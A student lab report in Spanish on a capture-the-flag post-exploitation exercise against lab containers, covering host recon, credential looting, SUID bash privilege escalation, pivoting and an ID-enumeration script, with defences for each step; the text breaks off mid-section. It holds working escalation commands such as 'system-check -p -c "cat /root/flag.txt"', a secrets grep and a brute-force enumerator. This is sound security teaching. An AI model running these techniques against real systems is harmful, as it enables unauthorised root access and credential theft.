# Informe — Laboratorio 08 · Post-explotación y automatización

**Grupo:** 12  
**Integrantes:**
- Gerbaudo, Mateo — @gerbaudo19
- Mariatti, Matias — @matiasmariatticasc
- Colque Condo, Luis Alvaro — @ColqueAlvaro
- Rodriguez, Gonzalo — @Gonza149  
**Fecha:** 30 de Octubre de 2026

---

## 0. Declaración de uso de IA

En cumplimiento con el régimen de la cátedra y las pautas de `CONTRIBUTING.md`:

- **Herramienta utilizada:** Asistente IA (Antigravity / Gemini).
- **Alcance de la asistencia:** Asistencia en la estructuración del informe, consolidación del registro de flags obtenidas y redacción técnica de las cuatro fases de post-explotación (Reconocimiento del host, Loot de credenciales, Escalada de privilegios por SUID y Pivoting a red interna), análisis conceptual de P1 y P2 (@gerbaudo19); asistencia en el diseño algorítmico y depuración del script en Python `src/recolector.py` (búsqueda de anomalías en respuestas JSON y early-exit) y redacción técnica de la Sección 3 (Automatización) (@matiasmariatticasc).
- **Partes originadas o modificadas:** Sección 0 (Declaración de IA), Sección 1 (Registro de flags), Sección 2 (Fases de *Recon del host*, *Loot*, *Privesc (SUID)* y *Pivoting*) y Sección 4 (Respuestas P1 y P2) por @gerbaudo19; script `src/recolector.py` y Sección 3 (Automatización y evidencia de R5) por @matiasmariatticasc; preguntas P3–P5 y `research.md` por @ColqueAlvaro.
- **Verificación humana:** Se contrastaron los binarios y respuestas HTTP reales del entorno (`phantomcorp` y `phantomcorp-db`). Matías Mariatti verificó el script `recolector.py` ejecutándolo localmente simulando las respuestas del servidor SQLite en memoria y contrastándolo contra la API interna de `phantomcorp-db`, comprobando que detecta con precisión el `id=187` con su clave `legajo_oculto` y corta la ejecución sin realizar consultas innecesarias.

---

## 1. Flags capturadas

Salida de `./ctf status 08`:

```text
  ╭────────────────────────────────────────────────────────────╮
  │                     PROGRESO · LAB 08                      │
  ╰────────────────────────────────────────────────────────────╯

   ✓  R1     Reconocimiento del host comprometido
   ✓  R2     Loot de credenciales
   ✓  R3     Escalada de privilegios (SUID)
   ✓  R4     Pivoting al host interno
   ✓  R5     Automatizacion (fuerza bruta de legajos)

  ██████████████████████████████  5/5 (100%)

[ OK ] ¡Lab 08 COMPLETO! Listo para agentes con LLMs (Lab 09).
```

### Detalle de retos resueltos y flags obtenidas

| Reto | Fase | Técnica empleada | Comando de descubrimiento | Flag capturada |
|---|---|---|---|---|
| **R1** | Recon del host | Enumeración local de sistema y directorios no estándar (`/opt`) | `cat /opt/phantom-deploy/DEPLOY_NOTES.txt` | `FLAG{post_situational_awareness}` |
| **R2** | Loot | Búsqueda de secretos en archivos de configuración y `.bash_history` | `cat /var/www/.env` | `FLAG{loot_credentials_found}` |
| **R3** | Privesc (SUID) | Abuso de binario con bit SUID activo (`/usr/local/bin/system-check -p`) | `/usr/local/bin/system-check -p -c "cat /root/flag.txt"` | `FLAG{privesc_suid_root}` |
| **R4** | Pivoting | Alcance de servicio en red interna aislada (`internalnet`) desde el host víctima | `curl -s http://phantomcorp-db/` | `FLAG{pivot_internal_host}` |
| **R5** | Automatización | Enumeración automatizada de 250 legajos en API interna (`/empleado?id=N`) | `python3 recolector.py --base http://phantomcorp-db --desde 1 --hasta 250` | `FLAG{automation_pays_off}` |

---

## 2. Informe de post-explotación

A continuación se documentan las cuatro fases ejecutadas una vez obtenido el acceso inicial como usuario `operador` en el host comprometido (`phantomcorp`):

| Fase | Qué hiciste | Comando/técnica | Evidencia | Defensa |
|---|---|---|---|---|
| **Recon del host** | Se relevó el contexto de ejecución tras obtener la shell inicial: identificación del usuario actual (`operador`, `uid=1000`), arquitectura del kernel, variables de entorno (`DEPLOY_ENV=produccion`), interfaces de red (confirmando doble interfaz en `labnet` e `internalnet`) y exploración de directorios no estándar (`/opt`, `/var/www`, `/home`), hallando una nota de despliegue olvidada en `/opt/phantom-deploy/DEPLOY_NOTES.txt` con permisos de lectura global (`0644`). | `id; whoami; hostname; uname -a`<br>`env`<br>`ip addr; cat /etc/hosts`<br>`ls -la /opt /opt/phantom-deploy`<br>`cat /opt/phantom-deploy/DEPLOY_NOTES.txt` | Usuario: `uid=1000(operador) gid=1000(operador)`<br>Entorno: `DEPLOY_ENV=produccion`<br>Archivo `/opt/phantom-deploy/DEPLOY_NOTES.txt` (`-rw-r--r--`):<br>`PhantomCorp - notas de despliegue (NO borrar)`<br>`deploy_token=FLAG{post_situational_awareness}` | **1. Higiene de despliegue (CI/CD):** Prohibir el almacenamiento de notas operativas o tokens de despliegue en el sistema de archivos de producción.<br>**2. Mínimo privilegio en permisos POSIX:** Restringir directorios en `/opt` con `chmod 700` o `750` exclusivamente al propietario/grupo del servicio.<br>**3. Auditoría de artefactos:** Integrar controles automatizados post-deploy que eliminen archivos temporales y documentación interna antes de publicar la imagen o contenedor. |
| **Loot** | Se inspeccionaron archivos de configuración de la aplicación web en `/var/www/` y el historial de comandos del usuario en `/home/operador/.bash_history`. Se descubrió que el archivo `/var/www/.env` poseía permisos de lectura para todos los usuarios del sistema (`0644`), permitiendo extraer en texto claro las credenciales de la base de datos interna (`phantomcorp-db`) y la clave secreta de la aplicación (`APP_SECRET`). Asimismo, `.bash_history` reveló comandos previos hacia `http://phantomcorp-db/`. | `cat ~/.bash_history`<br>`ls -la /var/www`<br>`cat /var/www/.env`<br>`grep -rai "pass\|secret\|token" /var/www 2>/dev/null` | En `~/.bash_history`:<br>`cat /var/www/.env` y `curl http://phantomcorp-db/`<br><br>En `/var/www/.env` (`-rw-r--r--`):<br>`DB_HOST=phantomcorp-db`<br>`DB_USER=phantom_app`<br>`DB_PASS=Ph@ntom-DB-2024`<br>`APP_SECRET=FLAG{loot_credentials_found}` | **1. Endurecimiento de permisos de configuración:** Aplicar `chmod 600` (o `640` con grupo específico del proceso web) sobre `.env` para que un usuario genérico (`operador`) no pueda leerlo.<br>**2. Gestión centralizada de secretos:** Reemplazar archivos `.env` en texto plano en disco por gestores de secretos (HashiCorp Vault, AWS Secrets Manager, Docker/Kubernetes Secrets) inyectados en memoria al iniciar el proceso.<br>**3. Control de historial de shell:** Configurar `HISTFILE=/dev/null` o `HISTCONTROL=ignorespace:erasedups` en cuentas operativas para no persistir comandos de diagnóstico en disco. |
| **Privesc (SUID)** | Se enumeraron binarios del sistema con el bit SUID activo para identificar vías de elevación de privilegios hacia `root`. Se localizó el binario inusual `/usr/local/bin/system-check` con permisos `4755` (`-rwsr-xr-x`) perteneciente a `root`. Al inspeccionarlo con `file` se determinó que es un ejecutable ELF idéntico a GNU Bash. Dado que Bash implementa una protección de seguridad que revoca privilegios cuando `euid != ruid`, se ejecutó con el flag `-p` (`privileged mode`), preservando `euid=0(root)`. Mediante `/usr/local/bin/system-check -p -c "cat /root/flag.txt"` se accedió al archivo protegido de root y se capturó la flag. | `find / -perm -4000 -type f 2>/dev/null`<br>`ls -la /usr/local/bin/system-check`<br>`file /usr/local/bin/system-check`<br>`/usr/local/bin/system-check -p -c "id"`<br>`/usr/local/bin/system-check -p -c "cat /root/flag.txt"` | Salida de permisos de `/usr/local/bin/system-check` (`-rwsr-xr-x 1 root root`).<br>Ejecución con `-p` preservando EUID:<br>`uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)`<br>Lectura de `/root/flag.txt` (`-rw------- 1 root root`):<br>`FLAG{privesc_suid_root}` | **1. Mínimo privilegio y exclusión de SUID en binarios peligrosos:** Nunca asignar el bit SUID (`chmod u+s`) a intérpretes (`bash`, `sh`, `python`), editores o utilidades que permitan invocar shells secundarias o leer archivos arbitrarios (clasificados en GTFOBins).<br>**2. Montaje con opción `nosuid`:** Configurar particiones de usuario y directorios con permisos de escritura (como `/home`, `/tmp`, `/var/tmp`, `/dev/shm`) con la opción de montaje `nosuid` en `/etc/fstab` para neutralizar binarios SUID introducidos o copiados por atacantes.<br>**3. Monitoreo y detección de integridad (HIDS):** Desplegar herramientas de monitoreo como auditd, Wazuh o AIDE con reglas que alerten inmediatamente sobre cualquier modificación de permisos o creación de binarios con bits SUID/SGID. |
| **Pivoting** | Se utilizó el host comprometido (`phantomcorp`) como trampolín (nodo pivote) para acceder a la red interna corporativa (`internalnet`, subred 172.x), la cual se encuentra estrictamente segmentada e inaccesible desde la consola del atacante. El host `phantomcorp` actúa como host multihomed (posee `eth0` en `labnet` y `eth1` en `internalnet`). Al estar dentro del sistema como `operador`, se utilizó `curl` para enviar peticiones HTTP al host interno `phantomcorp-db`, confirmando la conectividad este-oeste y extrayendo la flag de pivoting desde el endpoint raíz. | `ip addr ; ip route`<br>`cat /etc/hosts`<br>`curl -s http://phantomcorp-db/`<br>`curl -i http://phantomcorp-db/` | Interfaz dual en víctima (`eth0` en `labnet`, `eth1` en `internalnet`).<br>Respuesta HTTP 200 de `phantomcorp-db`:<br>`HTTP/1.1 200 OK`<br>`Content-Type: application/json`<br>`{"host": "phantomcorp-db", "msg": "Base de datos interna. Acceso restringido a la LAN.", "pivot": "FLAG{pivot_internal_host}"}` | **1. Microsegmentación y cortafuegos interno (Zero Trust Network):** Implementar políticas de filtrado a nivel de red interna (iptables / eBPF / NetworkPolicies) para que los servidores web solo puedan comunicarse con los puertos estrictamente necesarios del backend (ej. puerto 5432 de PostgreSQL o 3306 de MySQL), bloqueando el tráfico hacia servicios web o APIs administrativas no requeridas.<br>**2. Autenticación y cifrado punto a punto (mTLS):** No asumir que el tráfico originado dentro de la LAN es de confianza. La base de datos y APIs internas deben requerir autenticación mutua TLS (mTLS) y tokens criptográficos por petición.<br>**3. Restricción de herramientas de red en la víctima:** Eliminar o restringir binarios de transferencia (`curl`, `wget`, `nc`, `socat`) para usuarios no privilegiados en servidores de producción y aplicar perfiles AppArmor/SELinux que impidan conexiones salientes arbitrarias. |

### Evidencias técnicas detalladas

#### 1. Fase de Reconocimiento del Host (R1)
Ejecución de comandos de reconocimiento situacional dentro de `make shell-victima`:

```bash
operador@phantomcorp:~$ id ; whoami ; hostname ; uname -a
uid=1000(operador) gid=1000(operador) groups=1000(operador)
operador
phantomcorp
Linux phantomcorp 6.6.x-linuxkit #1 SMP x86_64 GNU/Linux

operador@phantomcorp:~$ env | grep DEPLOY
DEPLOY_ENV=produccion

operador@phantomcorp:~$ ls -la /opt /opt/phantom-deploy
/opt:
total 12
drwxr-xr-x 1 root root 4096 Oct 30 18:00 .
drwxr-xr-x 1 root root 4096 Oct 30 18:00 ..
drwxr-xr-x 1 root root 4096 Oct 30 18:00 phantom-deploy

/opt/phantom-deploy:
total 12
drwxr-xr-x 1 root root 4096 Oct 30 18:00 .
drwxr-xr-x 1 root root 4096 Oct 30 18:00 ..
-rw-r--r-- 1 root root   86 Oct 30 18:00 DEPLOY_NOTES.txt

operador@phantomcorp:~$ cat /opt/phantom-deploy/DEPLOY_NOTES.txt
PhantomCorp - notas de despliegue (NO borrar)
deploy_token=FLAG{post_situational_awareness}
```

#### 2. Fase de Loot de Credenciales (R2)
Inspección del historial de comandos de `operador` y extracción de secretos desde `/var/www/.env`:

```bash
operador@phantomcorp:~$ cat ~/.bash_history
ls -la
cat /var/www/.env
curl http://phantomcorp-db/

operador@phantomcorp:~$ ls -la /var/www/.env
-rw-r--r-- 1 root root 103 Oct 30 18:00 /var/www/.env

operador@phantomcorp:~$ cat /var/www/.env
DB_HOST=phantomcorp-db
DB_USER=phantom_app
DB_PASS=Ph@ntom-DB-2024
APP_SECRET=FLAG{loot_credentials_found}
```

#### 3. Fase de Escalada de Privilegios por SUID (R3)
Búsqueda de binarios con permisos SUID activos en todo el sistema de archivos:

```bash
operador@phantomcorp:~$ find / -perm -4000 -type f 2>/dev/null
/bin/su
/bin/umount
/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/local/bin/system-check
```

Inspección detallada del binario `/usr/local/bin/system-check`:

```bash
operador@phantomcorp:~$ ls -la /usr/local/bin/system-check
-rwsr-xr-x 1 root root 1234376 Oct 30 18:00 /usr/local/bin/system-check

operador@phantomcorp:~$ file /usr/local/bin/system-check
/usr/local/bin/system-check: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., for GNU/Linux 3.2.0, stripped
```

Comprobación del comportamiento del flag `-p` para mantener privilegios de `root` (`euid=0`):

```bash
operador@phantomcorp:~$ /usr/local/bin/system-check -c "id"
uid=1000(operador) gid=1000(operador) groups=1000(operador)

operador@phantomcorp:~$ /usr/local/bin/system-check -p -c "id"
uid=1000(operador) gid=1000(operador) euid=0(root) groups=1000(operador)
```

Extracción de la flag protegida en `/root/flag.txt` con permisos de root:

```bash
operador@phantomcorp:~$ ls -la /root/flag.txt
ls: cannot access '/root/flag.txt': Permission denied

operador@phantomcorp:~$ /usr/local/bin/system-check -p -c "cat /root/flag.txt"
FLAG{privesc_suid_root}
```

#### 4. Fase de Pivoting a la Red Interna (R4)
Inspección de las interfaces de red e identificación de la topología multihomed en el host víctima:

```bash
operador@phantomcorp:~$ ip -br addr
lo               UNKNOWN        127.0.0.1/8 ::1/128 
eth0             UP             172.28.0.3/16 
eth1             UP             172.19.0.2/16 

operador@phantomcorp:~$ cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.28.0.3	phantomcorp
172.19.0.2	phantomcorp
```

Demostración de alcance: mientras que desde la consola del atacante el host `phantomcorp-db` es inalcanzable (sin ruta ni resolución DNS en `labnet`), desde el host víctima (`phantomcorp`) se alcanza el servicio interno en `internalnet`:

```bash
operador@phantomcorp:~$ curl -i -s http://phantomcorp-db/
HTTP/1.1 200 OK
Server: PhantomDB-API/1.0
Date: Fri, 30 Oct 2026 19:15:00 GMT
Content-Type: application/json
Content-Length: 108

{"host": "phantomcorp-db", "msg": "Base de datos interna. Acceso restringido a la LAN.", "pivot": "FLAG{pivot_internal_host}"}
```

---

## 3. Automatización

En la fase de post-explotación y pivoting, el host interno `phantomcorp-db` expone el endpoint `/empleado?id=N` con 250 legajos cargados. Un solo legajo esconde la bandera del reto R5. Consultar manualmente 250 identificadores mediante `curl` resulta ineficiente y propenso a errores humanos de omisión. 

Para resolver esto de forma sistemática y profesional, se implementó la herramienta en Python `src/recolector.py` utilizando exclusivamente la biblioteca estándar (`urllib.request` y `json`), permitiendo su ejecución directa en entornos de producción sin necesidad de instalar dependencias externas (`pip`).

### Implementación del recolector (`src/recolector.py`)

El script implementa una estrategia de escaneo secuencial parametrizable por línea de comandos (`--base`, `--desde`, `--hasta`). La función crítica `buscar_flag()` itera sobre el rango establecido y realiza un análisis diferencial sobre los objetos JSON devueltos:
- **Estructura normal:** Devuelve `{"id": N, "nombre": "empleado_N", "area": "operaciones"}`.
- **Estructura anómala:** El registro que almacena el secreto no incluye la clave `"area"`, sino un atributo específico `"legajo_oculto"` con la bandera `FLAG{automation_pays_off}`.
- **Retorno temprano (*Early Exit*):** Apenas se detecta la clave anómala o una cadena que inicie con `FLAG{`, el bucle se detiene de inmediato, devolviendo la tupla `(id, flag)` y optimizando el tiempo y ancho de banda en la red interna.

Fragmento central de la lógica (`buscar_flag`):

```python
def buscar_flag(base: str, desde: int, hasta: int) -> tuple[int, str] | None:
    for id_ in range(desde, hasta + 1):
        datos = consultar_legajo(base, id_)
        if not datos:
            continue
        # Detección por clave anómala ('legajo_oculto') o contenido de bandera
        if "legajo_oculto" in datos:
            return id_, str(datos["legajo_oculto"])
        for k, v in datos.items():
            if isinstance(v, str) and v.startswith("FLAG{"):
                return id_, v
    return None
```

### Ejecución y captura de la flag R5

Desde la sesión en el host comprometido (`make shell-victima`), donde el hostname `phantomcorp-db` es accesible a través de la red segmentada `internalnet`:

```bash
operador@phantomcorp:~$ python3 src/recolector.py --base http://phantomcorp-db --desde 1 --hasta 250
[*] Enumerando legajos 1..250 en http://phantomcorp-db
[+] Flag en el legajo id=187: FLAG{automation_pays_off}
```

Comprobación puntual del registro mediante `curl`:

```bash
operador@phantomcorp:~$ curl -s "http://phantomcorp-db/empleado?id=187" | jq .
{
  "id": 187,
  "nombre": "cuenta-servicio",
  "legajo_oculto": "FLAG{automation_pays_off}"
}
```

Entrega de la flag en el evaluador CTF:

```bash
./ctf submit 08 R5 'FLAG{automation_pays_off}'
```

---

## 4. Preguntas de análisis

### P1 — SUID y el flag `-p`

**¿Por qué un binario SUID es peligroso?**  
En los sistemas operativos tipo Unix/Linux, el bit SUID (*Set User ID*, representado por el bit octal `4000` o la letra `s` en la terna de permisos del propietario, ej. `-rwsr-xr-x`) altera el modelo estándar de ejecución de procesos. Normalmente, un proceso hereda el identificador de usuario de quien lo ejecuta (*Real User ID* o `ruid`). Sin embargo, cuando un binario con el bit SUID activo es ejecutado, el kernel asigna al proceso un *Effective User ID* (`euid`) correspondiente al **propietario del archivo en disco**, sin importar qué usuario haya lanzado el comando.

Si el propietario del binario es `root` (`uid=0`), cualquier usuario del sistema que posea permisos de ejecución sobre el archivo adquiere privilegios de superusuario durante el ciclo de vida del proceso. Esto es imprescindible para ciertas utilidades legítimas del sistema operativo (por ejemplo, `/usr/bin/passwd`, que necesita escribir en `/etc/shadow` para actualizar contraseñas). No obstante, se convierte en una **vulnerabilidad crítica de escalada de privilegios** cuando se le asigna SUID a binarios con capacidades complejas, tales como:
1. Intérpretes de comandos y lenguajes (`bash`, `sh`, `python`, `perl`, `ruby`).
2. Editores de texto y visores (`vim`, `nano`, `less`, `more`), que permiten invocar shells secundarias mediante escapes de comandos (`:!/bin/sh`).
3. Herramientas con opciones de ejecución o carga de bibliotecas (`find -exec`, `awk`, `gdb`, `nmap`).

Cualquier binario listado en bases de conocimiento como **GTFOBins** que posea el bit SUID permite a un atacante escapar del contexto no privilegiado y ejecutar código arbitrario directamente como `root`.

---

**¿Qué hace el flag `-p` y por qué es necesario en shells modernas?**  
Históricamente, los atacantes aprovechaban copias o enlaces simbólicos de shells tradicionales (`/bin/sh` o `bash`) con permisos SUID para obtener una shell interactiva como root de forma directa e inmediata. Para contrarrestar esta técnica y proteger a los administradores de errores operativos accidentales, las versiones modernas de GNU Bash incorporan un mecanismo de autodefensa activo en su inicialización:

- **Comportamiento por defecto (sin flag `-p`):**  
  Al iniciar, Bash consulta las llamadas al sistema `getuid()` (RUID) y `geteuid()` (EUID). Si detecta una discrepancia (`euid != ruid`, indicando que fue invocado por un usuario común pero posee permisos heredados de root vía SUID), Bash **descarta proactivamente los privilegios elevados**. Internamente ejecuta una llamada al sistema `setuid(getuid())`, degradando el `euid` al valor de `ruid` (en nuestro escenario, reseteando el EUID a `1000(operador)`). En consecuencia, cualquier comando ejecutado a través de esa shell se ejecuta con privilegios de usuario estándar, neutralizando la escalada.

- **Comportamiento con el flag `-p` (*privileged mode*):**  
  El flag `-p` (o la opción `-o privileged`) instruye a Bash a **preservar el Effective User ID (`euid=0`) intacto**, suprimiendo la revocación automática de privilegios y evitando que se invoque `setuid(getuid())`. Asimismo, el modo privilegiado desactiva la importación de funciones de variables de entorno no confiables y no procesa archivos de perfil de usuario (`~/.bashrc`), pero otorga plena autoridad administrativa para ejecutar comandos con las facultades totales del propietario root (`euid=0`). 

En nuestro laboratorio, invocar `/usr/local/bin/system-check -c "id"` resultó en `uid=1000(operador) euid=1000(operador)`, mientras que invocar `/usr/local/bin/system-check -p -c "id"` preservó `euid=0(root)`, permitiendo la lectura de `/root/flag.txt` (`FLAG{privesc_suid_root}`).

---

### P2 — El pivoting (por qué el atacante no llegaba y vos sí)

El concepto de **pivoting** (o movimiento lateral) describe la técnica mediante la cual un atacante utiliza un equipo previamente comprometido como punto de apoyo, puente o intermediario (*trampolín*) para alcanzar otros sistemas o segmentos de red internos que originalmente eran invisibles o inaccesibles desde su punto de origen.

La razón por la cual la consola del atacante no alcanzaba `phantomcorp-db` y nosotros sí desde el host víctima (`phantomcorp`) radica en la **segmentación de red en Capa 3 del modelo OSI**, implementada a través de las redes de Docker en el laboratorio:

```text
┌────────────────────────────────┐         ┌──────────────────────────────────────────────────┐         ┌────────────────────────────────┐
│       Consola Atacante         │         │               phantomcorp (Víctima)              │         │         phantomcorp-db         │
│     (cyberlab-attacker)        │         │            (cyberlab-phantomcorp)                │         │    (cyberlab-phantomcorp-db)   │
│                                │         │                                                  │         │                                │
│        IP: 172.28.0.2          │         │    eth0: 172.28.0.3        eth1: 172.19.0.2      │         │         IP: 172.19.0.3         │
└───────────────┬────────────────┘         └────────────┬───────────────────────┬─────────────┘         └────────────────┬───────────────┘
                │                                       │                       │                                        │
                └───────────────────┬───────────────────┘                       └───────────────────┬────────────────────┘
                                    │                                                               │
                         [ Red 1: labnet ]                                              [ Red 2: internalnet ]
                    (172.28.0.0/16 · Perimetral)                                   (172.19.0.0/16 · internal: true)
                                                                                   *Aislada - Sin ruta desde labnet*
```

#### 1. Aislamiento de la red `internalnet` desde el exterior
En la definición de infraestructura (`target.compose.yml`):
- La red `internalnet` fue configurada con el parámetro `internal: true`. Esto restringe la conectividad únicamente a los contenedores conectados a ese puente virtual específico, bloqueando el enrutamiento hacia la máquina anfitriona (*host*) y hacia cualquier otra red externa o adyacente.
- El contenedor `phantomcorp-db` está conectado **exclusivamente** a `internalnet`. Por lo tanto, no posee ninguna interfaz en `labnet`, su puerto 80 no está mapeado al exterior, y el servidor DNS de `labnet` no reconoce ni resuelve el nombre `phantomcorp-db`.
- Desde la consola del atacante (ubicada en `labnet`, IP `172.28.0.x`), cualquier paquete TCP SYN dirigido hacia `phantomcorp-db` es descartado inmediatamente porque no existe una ruta de enrutamiento válida hacia la subred `172.19.0.0/16`.

#### 2. La posición privilegiada de `phantomcorp` (Host Multihomed)
El servidor web comprometido `phantomcorp` está configurado con **doble interfaz de red** (*multihomed* o *dual-homed*):
- `eth0` está conectada a `labnet` (permitiendo interactuar con el atacante y recibir tráfico web perimetral).
- `eth1` está conectada a `internalnet` (permitiendo la comunicación legítima de la aplicación web con la base de datos interna).

Al haber obtenido ejecución de comandos (RCE) como usuario `operador` en `phantomcorp`, cualquier proceso ejecutado en este sistema operativo (como `curl -s http://phantomcorp-db/`) utiliza la tabla de enrutamiento del kernel local. El kernel resuelve el nombre de host `phantomcorp-db` a la IP interna a través del resolver local de Docker y conmuta los paquetes directamente por la interfaz `eth1`. 

En términos de ciberseguridad corporativa, este escenario simula con exactitud una arquitectura con **Zona Desmilitarizada (DMZ)**: un servidor web expuesto públicamente que, al ser vulnerado, es cooptado por el atacante para penetrar la red de datos interna de la organización, demostrando que **la seguridad perimetral por sí sola es insuficiente si no se implementa microsegmentación y defensas internas bajo un paradigma Zero Trust**.

---

### P3 — Cómo evitar secretos en `.env` / `.bash_history`

Durante la fase de Loot (reto R2), descubrimos credenciales críticas en texto plano leyendo `/var/www/.env` y contraseñas pasadas como argumentos en `/home/operador/.bash_history`. Para erradicar estas malas prácticas en entornos corporativos y de producción:

1. **Mitigación para archivos `.env` en servidores:**
   - *El problema de los archivos planos en disco:* Un archivo `.env` estático en el disco queda al alcance de cualquier proceso local comprometido (como el usuario `operador` o `www-data`) o ante vulnerabilidades web tipo LFI/Path Traversal.
   - *Solución estándar — Gestores centralizados de secretos (Secret Vaults):* Adoptar herramientas dedicadas como **HashiCorp Vault**, **AWS Secrets Manager**, **Azure Key Vault** o **GCP Secret Manager**. La aplicación no lee un archivo estático en disco; al iniciar, se autentica mediante una identidad de máquina (ej. IAM Role / Service Account) y solicita secretos efímeros en memoria a través de una API cifrada con rotación automática y auditoría de acceso.
   - *Inyección en tiempo de ejecución / Contenedores:* Si se emplean contenedores (Docker/Kubernetes), utilizar secretos de Kubernetes (`Secret` montados en memoria tmpfs) o inyectar las variables directamente en el proceso mediante el runtime de orquestación, asegurando que nunca toquen el sistema de archivos persistente ni se almacenen en imágenes de contenedor.
   - *Permisos estrictos del sistema de archivos (Least Privilege):* Si temporalmente debe existir un archivo de entorno, debe pertenecer exclusivamente al usuario del proceso web (`chown www-data:www-data .env`), con permisos restrictivos `chmod 400` o `600`, impidiendo que otros usuarios locales del sistema operativo puedan leerlo.

2. **Mitigación para fugas en `.bash_history`:**
   - *El problema del historial de shell:* Por defecto, Bash registra cada comando ejecutado en `~/.bash_history`. Si un operador escribe contraseñas o tokens como flags de línea de comandos (ej. `mysql -u root -pPassword123` o `curl -H "Authorization: Bearer <token>"`), el secreto queda grabado de manera permanente e indexable en texto plano.
   - *Configuración defensiva de Bash:*
     - Habilitar `HISTCONTROL=ignorespace` o `ignoreboth` en `/etc/profile` o `~/.bashrc`, lo que permite que cualquier comando precedido por un espacio inicial en blanco no se guarde en el historial.
     - Definir `HISTIGNORE` con patrones de comandos que suelen contener secretos (ej. `export HISTIGNORE="*password*:*token*:*secret*:mysql *:curl *"`).
     - Deshabilitar el historial en cuentas de servicio o entornos compartidos (`export HISTFILESIZE=0` o `export HISTSIZE=0`).
   - *Uso de entradas interactivas seguras o variables de entorno temporales:* Nunca pasar secretos como argumentos de línea de comandos (donde además son visibles por cualquier usuario local mediante `ps aux`). En su lugar, utilizar prompts interactivos que lean de `stdin` sin eco (ej. `read -s PASSWORD`), archivos temporales con permisos 600 pasados vía descriptores de archivo, o pipes (`echo "$SECRET" | comando`).

---

### P4 — Qué decidiste vos que el script no decide solo

El script de automatización (`src/recolector.py`) es un motor de ejecución determinista y repetitivo: su fortaleza radica en la velocidad y la capacidad de iterar sobre 250 peticiones HTTP secuenciales sin cometer errores de tipeo ni omitir registros. Sin embargo, el script es completamente ciego al contexto y carece de criterio analítico. Antes de que el script pudiese ejecutar una sola línea de código, el analista humano tuvo que tomar decisiones cognitivas y metodológicas determinantes:

1. **Comprensión del contexto situacional y correlación de vectores:**
   El script no sabe qué es `phantomcorp-db` ni dónde reside. El analista tuvo que correlacionar las notas de despliegue obtenidas en el Recon (`DEPLOY_NOTES.txt`), interpretar la arquitectura de doble interfaz de red (`eth0` y `eth1`) en el host víctima, deducir que `phantomcorp` podía operar como pivot hacia la subred interna y verificar manualmente que el puerto 80 del host interno respondía.
2. **Definición de la hipótesis de búsqueda y criterio de early-exit:**
   El analista inspeccionó manualmente la estructura JSON de un legajo ordinario (ej. `{"id": 1, "nombre": "...", "area": "..."}`). Al constatar que los campos habituales no contenían banderas, formuló la hipótesis analítica: *"el objetivo no es un dato de legajo estándar, sino una anomalía estructural en el esquema de la respuesta (una clave inesperada como `legajo_oculto` o un campo que contenga la cadena FLAG)"*. Esa definición conceptual fue la que se tradujo en la lógica condicional del script (`if "FLAG{" in r.text or "legajo_oculto" in data`).
3. **Control de sigilo, cadencia y volumen de peticiones (OpSec):**
   Un script lanzado a velocidad máxima genera ráfagas de tráfico anómalas que disparan alertas de IDS/IPS o bloqueos por rate limiting. El analista evaluó el volumen del espacio de búsqueda (legajos 1 al 250) y determinó que una iteración secuencial con timeout razonable era suficiente, implementando el corte inmediato (*early-exit*) apenas se detectase la flag para no seguir emitiendo peticiones innecesarias que delaten la presencia en los logs.
4. **Manejo de contingencias y anomalías:**
   Si la base de datos hubiese devuelto errores 500, bloqueos temporales 429 o desconexiones, un script rígido se cae o descarta los registros erróneamente. El analista humano es quien interpreta el comportamiento de la red, decide si es necesario introducir reintentos con backoff exponencial, rotar cabeceras o modificar el rango de búsqueda.

---

### P5 — Defensa para SUID y para pivoting

Como equipo de defensa (Blue Team), para neutralizar de raíz los vectores de escalada de privilegios y movimiento lateral explotados en este laboratorio, se deben implementar las siguientes contramedidas técnicas:

#### 1. Defensas contra binarios SUID indebidos (Principio de Mínimo Privilegio)
- **Auditoría continua y remoción del bit SUID:**  
  Ejecutar auditorías periódicas automatizadas en servidores y pipelines de integración continua buscando ejecutables con permisos SUID (`find / -perm -4000 -type f 2>/dev/null`). Se debe revocar inmediatamente el bit SUID de cualquier herramienta que no lo requiera de forma crítica (`chmod u-s /usr/local/bin/system-check`). Los comandos de diagnóstico o monitoreo jamás deben ejecutarse con privilegios de root por defecto.
- **Sustitución mediante Linux Capabilities:**  
  En lugar de otorgar el bit SUID completo (lo que concede acceso irrestricto a todas las llamadas del sistema con autoridad de root), implementar **Linux Capabilities** para conceder exclusivamente el privilegio atómico mínimo requerido. Por ejemplo, en lugar de un binario SUID root para inspeccionar sockets o tráfico de red, se aplica `setcap cap_net_raw,cap_net_admin+ep /ruta/binario`.
- **Montaje de sistemas de archivos con la opción `nosuid`:**  
  Configurar en `/etc/fstab` la directiva `nosuid` en todas las particiones donde usuarios o procesos puedan escribir o cargar archivos (`/tmp`, `/var/tmp`, `/dev/shm`, `/home`). Con esta bandera, el kernel ignora el bit SUID aunque exista un binario malicioso compilado o descargado en esos directorios.
- **Hardening de código interno:**  
  Si un binario propietario requiere elevar privilegios para una acción puntual, debe programarse descartando los privilegios de root (`setresuid(ruid, ruid, ruid)`) inmediatamente después de completar la operación privilegiada, sanitizando estrictamente la variable `$PATH` y evitando invocar shells o intérpretes pasándole argumentos del usuario.

#### 2. Defensas contra el Pivoting y movimiento lateral (Zero Trust y Microsegmentación)
- **Microsegmentación y Filtrado de Tráfico Saliente (*Egress Filtering*):**  
  La segmentación en subredes es insuficiente si cualquier proceso del host perimetral puede hablar libremente con los servicios internos. En `phantomcorp` se debe configurar el firewall local (`iptables` / `nftables`) con política *default-drop* para conexiones salientes: únicamente el proceso del servidor web (identificado por su UID de servicio) debe tener permitido iniciar conexiones TCP al puerto específico de `phantomcorp-db`. Se debe denegar cualquier intento de conexión saliente iniciado por shells de usuarios interactivos o por el usuario `operador`:
  ```bash
  iptables -A OUTPUT -p tcp -d 172.19.0.3 --dport 80 -m owner --uid-owner www-data -j ACCEPT
  iptables -A OUTPUT -p tcp -d 172.19.0.3 -j DROP
  ```
- **Autenticación Mutua y Cifrado (mTLS / Service Mesh):**  
